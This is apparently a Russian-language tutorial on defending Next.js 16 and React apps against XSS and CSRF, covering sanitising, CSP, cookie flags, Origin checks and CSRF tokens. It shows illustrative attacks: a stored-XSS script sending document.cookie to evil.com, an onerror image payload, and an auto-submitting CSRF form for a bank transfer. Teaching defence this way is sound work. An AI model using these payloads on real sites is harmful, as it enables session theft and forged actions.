# Безопасность: XSS и CSRF

> Стек: Next.js 16 (App Router), React 19, TypeScript

---

## Оглавление

1. [XSS — фундамент](#xss--фундамент)
2. [Три вида XSS и как они работают](#три-вида-xss)
3. [Защита от XSS в Next.js / React](#защита-от-xss-в-nextjs--react)
4. [CSRF — фундамент](#csrf--фундамент)
5. [Защита от CSRF в Next.js](#защита-от-csrf-в-nextjs)
6. [Ключевое различие XSS vs CSRF](#ключевое-различие)
7. [Чеклист для Senior-разработчика](#чеклист)

---

## XSS — фундамент

**XSS (Cross-Site Scripting)** — атака, при которой злоумышленник внедряет вредоносный JavaScript-код в страницу, которую видят другие пользователи. Браузер жертвы выполняет этот код в контексте доверенного сайта.

### Почему это критично

Браузер не отличает «твой» JS от «вражеского». Если код оказался на странице — он выполняется с теми же правами, что и весь остальной JS: доступ к `document.cookie`, `localStorage`, DOM, возможность делать запросы от имени пользователя.

**Что может сделать XSS-атака:**
- Украсть сессионные куки (если они без `httpOnly`)
- Перехватить вводимые пароли через кейлоггер
- Полностью заменить содержимое страницы
- Сделать запросы к API от имени пользователя
- Перенаправить пользователя на фишинговый сайт

---

## Три вида XSS

### 1. Stored XSS (Хранимый)

**Механизм:** Вредоносный код сохраняется в базе данных и показывается всем пользователям.

**Пример:** Пользователь оставляет комментарий:
```html
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
```
Если сервер сохраняет это как есть, а фронтенд рендерит через `innerHTML` — скрипт выполнится у каждого, кто откроет страницу.

**Почему опасен больше остальных:** Автоматически атакует всех посетителей страницы без какого-либо взаимодействия с жертвой.

### 2. Reflected XSS (Отраженный)

**Механизм:** Вредоносный код приходит через URL-параметр, сервер вставляет его в HTML-ответ, браузер выполняет.

**Пример атаки:**
```
https://yourapp.com/search?q=<script>stealCookies()</script>
```

Жертве присылают эту ссылку. Если сервер рендерит `q` в HTML без санитайзинга — код выполнится.

**В контексте Next.js App Router:** Server Components могут быть уязвимы, если ты рендеришь `searchParams` напрямую через `dangerouslySetInnerHTML` или конкатенацию строк в HTML.

### 3. DOM-based XSS

**Механизм:** Атака происходит полностью на клиенте, сервер вообще не участвует. Вредоносный код попадает в DOM через опасные браузерные API.

**Опасные паттерны:**
```javascript
// ❌ Все эти операции потенциально опасны
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);
setTimeout(userInput, 1000); // строка, не функция!
location.href = userInput;   // javascript: scheme
new Function(userInput)();
```

**Реальный пример DOM XSS в React:**
```tsx
// ❌ НИКОГДА ТАК НЕ ДЕЛАЙ
function SearchHighlight({ query }: { query: string }) {
  return (
    <div
      dangerouslySetInnerHTML={{
        __html: `Результаты для: <b>${query}</b>`
      }}
    />
  );
}
// query = '<img src=x onerror=stealData()>' → XSS
```

---

## Защита от XSS в Next.js / React

### 1. JSX — твоя первая линия обороны

React по умолчанию **экранирует все строки** при рендеринге. Это не магия — это `React.createElement` и процесс reconciliation:

```tsx
// ✅ React автоматически экранирует
function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
  // text = '<script>evil()</script>'
  // Рендерится как: &lt;script&gt;evil()&lt;/script&gt;
}
```

**Но есть исключения:**
- `dangerouslySetInnerHTML` — намеренный обход защиты
- `href`, `src`, `action` — могут принимать `javascript:` URLs
- Server Components с шаблонными строками в HTML

### 2. dangerouslySetInnerHTML — единственное исключение

Бывает, когда это нужно: Markdown-контент, WYSIWYG-редакторы, highlight.js. В этом случае **обязателен санитайзинг**.

```tsx
import DOMPurify from 'isomorphic-dompurify';

interface RichTextProps {
  html: string;
  allowedTags?: string[];
}

function RichText({ html, allowedTags }: RichTextProps) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: allowedTags ?? ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ADD_ATTR: ['target'],
    FORCE_BODY: true,
  });

  return (
    <div
      dangerouslySetInnerHTML={{ __html: clean }}
      className="prose"
    />
  );
}
```

> **Важно:** `dompurify` работает только в браузере, поэтому для Next.js (SSR/SSG) используй `isomorphic-dompurify` или выноси санитайзинг на сервер перед сохранением в БД.

### 3. Санитайзинг на уровне Server Action

**Принцип:** Санитайзируй данные **при записи в БД**, а не только при отображении. Defense in depth.

```typescript
// actions/comments.ts
'use server';

import DOMPurify from 'isomorphic-dompurify';
import { z } from 'zod';

const CommentSchema = z.object({
  postId: z.string().uuid(),
  content: z.string().min(1).max(5000),
});

export async function createComment(formData: FormData) {
  const parsed = CommentSchema.safeParse({
    postId: formData.get('postId'),
    content: formData.get('content'),
  });

  if (!parsed.success) {
    return { error: 'Невалидные данные' };
  }

  // Санитайзируем перед записью — только текст, никакого HTML
  const sanitizedContent = DOMPurify.sanitize(parsed.data.content, {
    ALLOWED_TAGS: [],
  });

  // Проверяем авторизацию — ОБЯЗАТЕЛЬНО в каждом Server Action
  const session = await getSession();
  if (!session?.userId) throw new Error('Unauthorized');

  await db.comment.create({
    data: {
      postId: parsed.data.postId,
      content: sanitizedContent,
    },
  });
}
```

### 4. Content Security Policy (CSP)

CSP — HTTP-заголовок, который указывает браузеру, откуда разрешено загружать ресурсы и выполнять скрипты. Последняя линия обороны.

**В Next.js 16 CSP настраивается в `proxy.ts`** — это файл перехвата запросов (аналог `middleware.ts` в Next.js 14/15, переименованный в v16):

```typescript
// src/proxy.ts  (Next.js 16)
import { NextRequest, NextResponse } from 'next/server';

export function proxy(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const isDev = process.env.NODE_ENV === 'development';

  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${isDev ? " 'unsafe-eval'" : ''};
    style-src 'self' 'nonce-${nonce}';
    img-src 'self' blob: data: https:;
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
  `.replace(/\s{2,}/g, ' ').trim();

  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-nonce', nonce);
  requestHeaders.set('Content-Security-Policy', cspHeader);

  const response = NextResponse.next({
    request: { headers: requestHeaders },
  });
  response.headers.set('Content-Security-Policy', cspHeader);

  return response;
}
```

> **Next.js 16:** `middleware.ts` / `export function middleware()` заменены на `proxy.ts` / `export function proxy()`. Логика перехвата запросов (auth gate, CSP, i18n redirect) размещается именно там.

**Использование nonce в Server Component:**
```typescript
// app/page.tsx
import { headers } from 'next/headers';
import Script from 'next/script';

export default async function Page() {
  const nonce = (await headers()).get('x-nonce');

  return (
    <Script
      src="https://www.googletagmanager.com/gtag/js"
      strategy="afterInteractive"
      nonce={nonce ?? undefined}
    />
  );
}
```

### 5. httpOnly куки

```typescript
// app/api/auth/route.ts
import { cookies } from 'next/headers';

export async function POST(request: Request) {
  // ... аутентификация ...

  const cookieStore = await cookies(); // Next.js 16: await обязателен
  cookieStore.set('session', sessionToken, {
    httpOnly: true,    // Недоступна через document.cookie
    secure: true,      // Только HTTPS
    sameSite: 'lax',   // Защита от CSRF
    maxAge: 60 * 60 * 24 * 7, // 1 неделя
    path: '/',
  });
}
```

> **Важно:** Если ты используешь Auth.js (NextAuth v5), сессионные куки настраиваются в `auth.config.ts`, а не вручную. Не дублируй логику — доверяй библиотеке.

> **httpOnly не защищает от XSS полностью.** Злоумышленник всё ещё может делать запросы от имени пользователя, читать DOM, перехватывать ввод. Это лишь предотвращает кражу самого токена через `document.cookie`.

---

## CSRF — фундамент

**CSRF (Cross-Site Request Forgery)** — атака, при которой злоумышленник заставляет браузер авторизованного пользователя отправить запрос на твой сервер. Браузер автоматически прикрепляет куки — сервер считает запрос легитимным.

### Как это работает

```
1. Пользователь авторизован на bank.com (кука session=abc123)
2. Пользователь открывает evil.com
3. evil.com содержит:
   <img src="https://bank.com/transfer?to=hacker&amount=10000">
   или
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="hacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. Браузер автоматически отправляет запрос с кукой
5. Банк выполняет перевод
```

**Ключевой момент:** Атакующий не читает ответ — он только инициирует запрос. Поэтому CSRF эффективен только для state-changing операций (POST, PUT, DELETE), но не для GET с данными.

---

## Защита от CSRF в Next.js

### 1. SameSite Cookie (основная защита)

```typescript
cookieStore.set('session', token, {
  sameSite: 'lax',   // Или 'strict'
  httpOnly: true,
  secure: true,
});
```

**Разница между Lax и Strict:**

| Ситуация | `Strict` | `Lax` |
|----------|----------|-------|
| Переход по ссылке с другого сайта | ❌ Кука не отправляется | ✅ Отправляется |
| POST-форма с другого сайта | ❌ | ❌ |
| Fetch/XHR с другого сайта | ❌ | ❌ |
| Img/iframe с другого сайта | ❌ | ❌ |

`Lax` — практический выбор для большинства приложений. `Strict` ломает UX (пользователь не будет авторизован при переходе по ссылке из письма).

### 2. Server Actions — встроенная CSRF-защита (Next.js 13+)

Next.js Server Actions **автоматически проверяют Origin**. Фреймворк не выполнит Action, если запрос пришёл с постороннего Origin.

```typescript
// ✅ Server Actions защищены от CSRF по умолчанию
'use server';

export async function deletePost(postId: string) {
  // Next.js проверил Origin — но ты ОБЯЗАН проверять авторизацию сам!
  const session = await getSession();
  if (!session?.userId) throw new Error('Unauthorized');

  const post = await db.post.findUnique({ where: { id: postId } });
  if (post?.authorId !== session.userId) throw new Error('Forbidden');

  await db.post.delete({ where: { id: postId } });
}
```

**Расширение списка разрешённых origin** (например, для reverse-proxy, CDN):
```javascript
// next.config.ts
module.exports = {
  experimental: {
    serverActions: {
      allowedOrigins: ['my-proxy.com', '*.my-proxy.com'],
    },
  },
};
```

### 3. Проверка Origin/Referer в Route Handlers (дополнительный слой)

Для Route Handlers (API-эндпоинтов) автоматической CSRF-защиты нет — проверяй вручную:

```typescript
// app/api/actions/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  const origin = request.headers.get('origin');
  const allowedOrigins = [process.env.NEXT_PUBLIC_APP_URL];

  if (!origin || !allowedOrigins.includes(origin)) {
    return new NextResponse('Forbidden', { status: 403 });
  }

  // ... бизнес-логика
}
```

### 4. CSRF-токены (для сложных случаев)

Когда нужны CSRF-токены: субдомены, мобильные WebView, старые браузеры, API для партнёров.

```typescript
// lib/csrf.ts
import { randomBytes, createHmac, timingSafeEqual } from 'crypto';

const SECRET = process.env.CSRF_SECRET!;

export function generateCsrfToken(sessionId: string): string {
  const random = randomBytes(32).toString('hex');
  const timestamp = Date.now().toString();
  const hmac = createHmac('sha256', SECRET)
    .update(`${sessionId}:${random}:${timestamp}`)
    .digest('hex');

  return `${random}.${timestamp}.${hmac}`;
}

export function validateCsrfToken(token: string, sessionId: string): boolean {
  const parts = token.split('.');
  if (parts.length !== 3) return false;

  const [random, timestamp, hmac] = parts;

  // Проверяем срок действия (1 час)
  if (Date.now() - parseInt(timestamp) > 3_600_000) return false;

  const expectedHmac = createHmac('sha256', SECRET)
    .update(`${sessionId}:${random}:${timestamp}`)
    .digest('hex');

  // Constant-time comparison — защита от timing attacks
  return timingSafeEqual(
    Buffer.from(hmac, 'hex'),
    Buffer.from(expectedHmac, 'hex')
  );
}
```

---

## Ключевое различие

| Характеристика | XSS | CSRF |
|----------------|-----|------|
| **Суть** | Выполнение кода в браузере жертвы | Отправка запроса от имени жертвы |
| **Что нужно атакующему** | Вставить код в страницу | Заставить браузер сделать запрос |
| **Читает данные** | ✅ Да, полный доступ к DOM | ❌ Нет, только инициирует действия |
| **httpOnly куки помогают от** | Кражи кук, но не от XSS | Ничем (кука всё равно отправляется) |
| **Основная защита** | Escaping + CSP | SameSite + встроенная защита Actions |
| **Выполняется где** | В браузере жертвы | Сервер жертвы обрабатывает запрос |

**Связь атак:** XSS может использоваться для обхода CSRF-защиты. Если атакующий может выполнить JS на твоём домене, он может прочитать CSRF-токен из DOM и использовать его. Поэтому XSS — более опасная атака.

---

## Чеклист

**XSS:**
- [ ] Никогда не используешь `dangerouslySetInnerHTML` без DOMPurify
- [ ] `href` с пользовательскими данными валидируется (блокируешь `javascript:`)
- [ ] CSP настроен в `proxy.ts` (Next.js 16) или `middleware.ts` (Next.js ≤15)
- [ ] Все куки с `httpOnly: true`
- [ ] Санитайзинг происходит и при записи в БД, и при отображении

**CSRF:**
- [ ] Все куки с `sameSite: 'lax'` минимум
- [ ] Для мутирующих Route Handler-эндпоинтов проверяется `Origin`
- [ ] Server Actions используются для форм — они защищены по умолчанию
- [ ] Если нужен расширенный список origin — задан `allowedOrigins` в `next.config.ts`
- [ ] CSRF-токены реализованы для legacy-сценариев (субдомены, WebView)

**Senior-мышление:**
- [ ] Понимаешь разницу между `sanitize` (убрать опасное) и `escape` (закодировать всё)
- [ ] Знаешь, что `SameSite` не работает для запросов внутри одного сайта
- [ ] Применяешь принцип Defense in Depth — несколько слоёв защиты
- [ ] Понимаешь, почему Server Actions безопаснее Route Handlers с точки зрения CSRF
